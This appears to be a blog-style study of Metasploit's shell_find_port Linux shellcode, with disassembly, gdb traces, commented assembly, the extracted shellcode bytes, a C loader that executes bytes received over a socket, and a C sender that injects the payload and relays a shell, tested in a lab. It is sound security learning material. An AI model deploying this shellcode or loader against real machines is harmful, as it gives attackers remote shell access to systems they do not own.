## Metasploit Shellcode Analysis (shell_find_port)

Payload:
linux/x86/shell_find_port

Description:
Spawn a shell on an established connection

Initial disassembly of payload:
Using metasploit to provide the payload for analysis the following will download and disassemble it.
```bash
$ sudo msfpayload -p linux/x86/shell_find_port CPORT=4444 R | ndisasm -u –
```
```nasm	
00000000  31DB              xor ebx,ebx
00000002  53                push ebx
00000003  89E7              mov edi,esp
00000005  6A10              push byte +0x10
00000007  54                push esp
00000008  57                push edi
00000009  53                push ebx
0000000A  89E1              mov ecx,esp
0000000C  B307              mov bl,0x7
0000000E  FF01              inc dword [ecx]
00000010  6A66              push byte +0x66
00000012  58                pop eax
00000013  CD80              int 0x80
00000015  66817F02C6F8      cmp word [edi+0x2],0x5c11
0000001B  75F1              jnz 0xe
0000001D  5B                pop ebx
0000001E  6A02              push byte +0x2
00000020  59                pop ecx
00000021  B03F              mov al,0x3f
00000023  CD80              int 0x80
00000025  49                dec ecx
00000026  79F9              jns 0x21
00000028  50                push eax
00000029  682F2F7368        push dword 0x68732f2f
0000002E  682F62696E        push dword 0x6e69622f
00000033  89E3              mov ebx,esp
00000035  50                push eax
00000036  53                push ebx
00000037  89E1              mov ecx,esp
00000039  99                cdq
0000003A  B00B              mov al,0xb
0000003C  CD80              int 0x80
```
Straightaway in the code above, following from the previous shellcode analyses, the code for an execve system call to execute a /bin/shell can be seen. The code for the dup2 system call can also be observed. Therefore even without a description of the shellcode it can be deduced that it gives the attacker a command shell, bound to stdin, stdout and stderr. As to what the rest of the code does will need further investigation.
```nasm
0000000C  B307              mov bl,0x7
00000010  6A66              push byte +0x66
00000012  58                pop eax
00000013  CD80              int 0x80
```
The above code snippet shows the code is using the getpeername as the call, its number being 0x7, in socketcall(), as found here:
```bash
cat /usr/include/linux/net.h | grep “SYS_”
```
```c
#define SYS_GETPEERNAME 7
```
The prototype for getpeername is as follows:
```c
int getpeername(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
```
It returns the address of the peer connected to the socket sockfd, in the buffer pointed to by addr.

With the code seemingly more complex than that of previous encounters it seemed prudent to investigate further to gain confidence and understanding of what is happening. The best plan is usually to start at the beginning, so a visit to the socket structures was an obvious first port of call.
```c
/usr/include/i386-linux-gnu/bits/sockaddr.h
 
#define __SOCKADDR_COMMON(sa_prefix) 
  sa_family_t sa_prefix##family
 
/usr/include/netinet/in.h    
 
struct sockaddr_in
{
    __SOCKADDR_COMMON (sin_);
    in_port_t sin_port;        /* Port number.  */
    struct in_addr sin_addr;   /* Internet address.  */
 
    /* Pad to size of `struct sockaddr'.  */
    unsigned char sin_zero[sizeof (struct sockaddr) -
        __SOCKADDR_COMMON_SIZE -
        sizeof (in_port_t) -
        sizeof (struct in_addr)];
};
```
The above was used as a guide for further study of the code, it was good to have this while working through the stack for example, as will be seen later in this post. To do this the GNU debugger (gdb) was used. The following is a cut down version of a gdb session.
```	
gdb -q getpeername
 
(gdb) set disassembly-flavor intel
(gdb) break _start
Breakpoint 1 at 0x8048060
(gdb) run
Starting program: getpeername 
 
Breakpoint 1, 0x08048060 in _start ()
(gdb) define hook-stop
Redefine command "hook-stop"? (y or n) y
Type commands for definition of "hook-stop".
End with a line saying just "end".
>disassemble 
>print $eax
>print $ebx
>print $ecx
>print $edx
>print $edi
>print $esi
>print $esp
>end
(gdb) stepi
....
(gdb) stepi
Dump of assembler code for function _start:
   0x08048060 <+0>:    xor    ebx,ebx
   0x08048062 <+2>:    push   ebx
   0x08048063 <+3>:    mov    edi,esp
   0x08048065 <+5>:    push   0x10
   0x08048067 <+7>:    push   esp
   0x08048068 <+8>:    push   edi
   0x08048069 <+9>:    push   ebx
   0x0804806a <+10>:   mov    ecx,esp
=> 0x0804806c <+12>:   mov    bl,0x7
End of assembler dump.
$43 = 0
$44 = 0
$45 = -1073744420
$46 = 0
$47 = -1073744404
$48 = 0
$49 = (void *) 0xbffff5dc
0x0804806c in _start ()
....
(gdb) stepi
Dump of assembler code for function LBL1:
=> 0x0804806e <+0>:    inc    DWORD PTR [ecx]
   0x08048070 <+2>:    push   0x66
   0x08048072 <+4>:    pop    eax
   0x08048073 <+5>:    int    0x80
   0x08048075 <+7>:    cmp    WORD PTR [edi+0x2],0x5c11
   0x0804807b <+13>:   jne    0x804806e <LBL1>
   0x0804807d <+15>:   pop    ebx
   0x0804807e <+16>:   push   0x2
   0x08048080 <+18>:   pop    ecx
End of assembler dump.
$50 = 0
$51 = 7
$52 = -1073744420 (0xbffff5dc)
$53 = 0
$54 = -1073744404 (oxbffff5ec)
$55 = 0
$56 = (void *) 0xbffff5dc
0x0804806e in LBL1 ()
(gdb) x/64xb 0xbffff5dc
0xbffff5dc: 0x00  0x00  0x00  0x00    0xec  0xf5  0xff  0xbf
0xbffff5e4: 0xe8  0xf5  0xff  0xbf    0x10  0x00  0x00  0x00
0xbffff5ec: 0x00  0x00  0x00  0x00    0x01  0x00  0x00  0x00
0xbffff5f4: 0x28  0xf7  0xff  0xbf    0x00  0x00  0x00  0x00
0xbffff5fc: 0x64  0xf7  0xff  0xbf    0x8d  0xf7  0xff  0xbf
0xbffff604: 0xa0  0xf7  0xff  0xbf    0xab  0xf7  0xff  0xbf
0xbffff60c: 0xbb  0xf7  0xff  0xbf    0x0c  0xf8  0xff  0xbf
0xbffff614: 0x1e  0xf8  0xff  0xbf    0x5e  0xf8  0xff  0xbf
```
As mentioned the above has been edited slightly to make it a bit clearer. From the above it was then simpler to work out what was happening on the stack in order to fill the socket based struct sockaddr, below shows a break down of stack dump and how the pushes create the arguments for the structure.
```	
0x0804806a <+10>:   mov    ecx,esp
ecx, pointer to 0xbffff5dc: (args for getpeername)
 
0xbffff5dc:  0x00 0x00 0x00 0x00    0xec 0xf5 0xff 0xbf
             |     push ebx    |    |     push edi    |
oxbffff5e4:  0xe8 0xf5 0xff 0xbf    0x10 0x00 0x00 0x00
             |     push esp    |    | push byte 0x10  |
0xbffff5ec:  0x00 0x00 0x00 0x00
             |     push ebx    |
```
A breakdown of the Loop used in the search for the nominated port.
```	
(gdb) stepi
Dump of assembler code for function LBL1:
   0x0804806e <+0>:   inc    DWORD PTR [ecx]
=> 0x08048070 <+2>:   push   0x66
   0x08048072 <+4>:   pop    eax
   0x08048073 <+5>:   int    0x80
   0x08048075 <+7>:   cmp    WORD PTR [edi+0x2],0x5c11
   0x0804807b <+13>:  jne    0x804806e <LBL1>
   0x0804807d <+15>:  pop    ebx
   0x0804807e <+16>:  push   0x2
   0x08048080 <+18>:  pop    ecx
End of assembler dump.
$148 = -88
$149 = 7
$150 = -1073744420 (0xbffff5dc)
$151 = 0
$152 = -1073744404
$153 = 0
$154 = (void *) 0xbffff5dc
(gdb) x/2xb 0xbffff5dc
0xbffff5dc: 0x03    0x00   <== incremented
```
Compare search with port (0x5c11, 4444).
```	
(gdb) stepi
Dump of assembler code for function LBL1:
   0x0804806e <+0>:   inc    DWORD PTR [ecx]
   0x08048070 <+2>:   push   0x66
   0x08048072 <+4>:   pop    eax
   0x08048073 <+5>:   int    0x80
   0x08048075 <+7>:   cmp    WORD PTR [edi+0x2],0x5c11
=> 0x0804807b <+13>:   jne    0x804806e <LBL1>
   0x0804807d <+15>:  pop    ebx
   0x0804807e <+16>:  push   0x2
   0x08048080 <+18>:  pop    ecx
End of assembler dump.
$134 = -88
$135 = 7
$136 = -1073744420
$137 = 0
$138 = -1073744404
$139 = 0
$140 = (void *) 0xbffff5dc
0x0804807b in LBL1 ()
(gdb) print $edi+2
$155 = -1073744402 (0xbffff5ee)
(gdb) x/2xb 0xbffff5ee
0xbffff5ee: 0x00    0x00
```
From earlier in the code it can be seen that the edi register contains a pointer to esp, which holds arguments to the sockaddr structure.
Code looking for port,
```nasm
cmp    WORD PTR [edi+0x2],0x5c11
```
How is it known that [edi+0x2] is the port. Refer back to the sockaddr structure prototype,
```c	
struct sockaddr_in
{
    __SOCKADDR_COMMON (sin_);
    in_port_t sin_port;         /* Port number.  */
    ...
```
The first word is,
```c	
__SOCKADDR_COMMON (sin_); 
```
Therefore it follows the second will be,
```c
in_port_t sin_port; /* Port number.  */
```
In the byte block above referencing 0xbffff5ee it can be seen the port is zero so the loop will continue until port number 4444 is found.

From all of the information above an assembly language program can be written and commented in order to better understand what the code is doing.
```nasm	
global _start
section .text
_start:
    xor     ebx,ebx
 
    ;int getpeername(int sockfd, struct sockaddr *addr, 
    ;   socklen_t *addrlen);
    push    ebx            ; null
    mov     edi,esp                 
    push    byte +0x10     ; addrlen
    push    esp
    push    edi            ; addr
    push    ebx            ; sockfd
    mov     ecx,esp        ; pointer to args
    mov     bl,0x7         ; getpeername()
LBL1:                      ; no, search for port
    inc     dword [ecx]    ; ++counter, (port number)
    push    byte +0x66     ; socketcall()
    pop     eax                 
    int     0x80           ; make the call
    cmp     word [edi+0x2],0x5c11   ; port 4444
    jnz     LBL1           ; found port?    
 
    ;int dup2(int oldfd, int newfd);
    pop     ebx            ; yes, found it
    push    byte +0x2      ; counter
    pop     ecx
LBL2:                      ; no, bind stdin/out/err
    mov     al,0x3f        ; dup2()
    int     0x80           ; make the call
    dec     ecx            ; --counter
    jns     LBL2           ; zero?
 
    ;int execve(const char *filename, char *const argv[],
    ;    char *const envp[]);
    push    eax            ; yes, null
    push    dword 0x68732f2f  ; hs//
    push    dword 0x6e69622f  ; nib/
    mov     ebx,esp        ; ebx, contains addr of //bin/sh
    push    eax            ; null
    push    ebx            ; pointer to //bin/sh
    mov     ecx,esp        ; ecx, contains addr of //bin/sh
    cdq
    mov     al,0xb         ; execve()
    int     0x80           ; make the call
```
To build the code:
```
$ nasm -felf32 -o getpeername.o getpeername.asm
$ ld -o getpeername getpeername.o
```
There is no need to check for nulls within the code as it can be seen from the initial disassembly that there are none.

Get shellcode from executable:
Use the following from the commandlinefu website replacing PROGRAM with the name of the required executable like so,
```bash
objdump -d ./getpeername|grep ‘[0-9a-f]:’|grep -v ‘file’|cut -f2 -d:|cut -f1-6 -d’ ‘|tr -s ‘ ‘|tr ‘t’ ‘ ‘|sed ‘s/ $//g’|sed ‘s/ /x/g’|paste -d ” -s |sed ‘s/^/”/’|sed ‘s/$/”/g’

“\x31\xdb\x53\x89\xe7\x6a\x10\x54\x57\x53\x89\xe1\xb3\x07\xff\x01\x6a\x66\x58\xcd\x80\x66\x81\x7f\x02\x11\x5c\x75\xf1\x5b\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80”
```
Paste this shellcode into the socket-send-reuse.c file, see below.

This code is not easily tested, as what it is trying to do is from within a process look for a connection on port 4444, when it finds that connection it then binds a shell to that port. Therefore in order to test this code it will firstly need to be transferred into a server process by a client that will also provide a connection via the relevant port then the shellcode can be executed, giving the attacker a command shell.

Sounds complex and it is, much research was required, but thankfully , due to previous research being done by some very talented people, there was a good explanation with examples to be found at the Blackhat Library.

So using the various source code files related to the Blackhat Library article, the following programs were amended.

File: socket-loader.c
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include <sys/types.h> 
#include <sys/socket.h>
#include <netinet/in.h>
  
void
execute(char *buffer) 
{
    void (*mem)() = mmap(0, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, 
        MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
    memcpy(mem, buffer, strlen(buffer));
    (*mem)();
}
  
int
main(int argc, char *argv[]) 
{
    char buffer[1024];
    int serverfd, clientfd;
    socklen_t client_len;
    struct sockaddr_in server_addr, client_addr;
    client_len = sizeof(client_addr);
      
    if (argc != 2) {
        printf("Usage: %s <port>n", argv[0]);
        exit(1);
    }
      
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(atoi(argv[1]));
    serverfd = socket(AF_INET, SOCK_STREAM, 0);
 
    bind(serverfd, (struct sockaddr *)&server_addr, sizeof(server_addr));
    listen(serverfd, 0);
    clientfd = accept(serverfd, (struct sockaddr *)&client_addr, 
        &client_len);
 
    printf("[*] Received %d bytes, executing.n", 
        read(clientfd,buffer,1024));
    execute(buffer);
 
    printf("[*] Closing sockets.n");
    close(clientfd);
    close(serverfd);
 
    return 0; 
}
```
File: socket-send-reuse.c
```c	
#include <sys/socket.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
 
// Port 4444 (x11x5c) 
char shellcode[] = {
"\x31\xdb\x53\x89\xe7\x6a\x10\x54\x57\x53\x89\xe1\xb3\x07\xff\x01"
"\x6a\x66\x58\xcd\x80\x66\x81\x7f\x02\x11\x5c\x75\xf1\x5b\x6a\x02"
"\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x50\x68\x2f\x2f\x73\x68\x68\x2f"
"\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
};
  
int
main(int argc, char *argv[]) 
{
    struct sockaddr_in server_addr, bind_addr;
    struct hostent* server, *_bind;
    char buf[1024], inbuf[1024];
    int sock;
  
    _bind = gethostbyname(argv[3]);
    bind_addr.sin_family = AF_INET;
    bind_addr.sin_port   = htons(atoi(argv[4]));
    memcpy(&bind_addr.sin_addr.s_addr, _bind->h_addr, _bind->h_length);
  
    server = gethostbyname(argv[1]);
    server_addr.sin_family = AF_INET;
    memcpy(&server_addr.sin_addr.s_addr, server->h_addr, server->h_length);
    server_addr.sin_port = htons(atoi(argv[2]));
  
    sock = socket(AF_INET, SOCK_STREAM, 0);
    bind(sock, (struct sockaddr *)&bind_addr, sizeof(bind_addr));
   
    printf("[*] Connecting to %sn", argv[1]);
    connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr));
   
    printf("[*] Sending payloadn");
    send(sock, shellcode, strlen(shellcode), MSG_NOSIGNAL);
 
    while(fgets(buf, 1024, stdin) != NULL) {
        send(sock, buf, strlen(buf), MSG_NOSIGNAL);
        recv(sock, inbuf, 1024, 0);
        printf("%s", inbuf);
        memset(inbuf, 0, 1024);
        memset(buf, 0, 1024);
    }
  
  return 0;
}
```
To build the source files:
```
$ gcc socket-loader.c -o socket-loader
$ gcc socket-send-reuse.c -o socket-send-reuse
```
Testing the code:
Open two terminals and test as per the terminal interaction below.
```	
Terminal 1,
/shellcode3$ ./socket-loader 4445
 
    Terminal 2,
    /shellcode3$ ./socket-send-reuse 10.51.53.49 4445 10.51.53.49 4444
     [*] Connecting to 10.51.53.49
     [*] Sending payload
 
Terminal 1,
/shellcode3$ ./socket-loader 4445
 [*] Received 62 bytes, executing.
 
    Terminal 2,
    /shellcode3$ ./socket-send-reuse 10.51.53.49 4445 10.51.53.49 4444
     [*] Connecting to 10.51.53.49
     [*] Sending payload
    ls
    getpeername
    getpeername.asm
    socket-loader
    socket-loader.c
    socket-send-reuse
    socket-send-reuse.c
    exit
 
Terminal 1,
/shellcode3$ ./socket-loader 4445
 [*] Received 62 bytes, executing.
/shellcode3$ 
```
It works! For shellcode it was found to be more complex in concept than previously studied code, therefore to fully understand what was going on within the code a number of tools came into play, namely gdb and the internet, many thanks to the contributors to the Blackhat Library. This was a fun study, a lot was learned and there is certainly more scope for further and more interesting research.
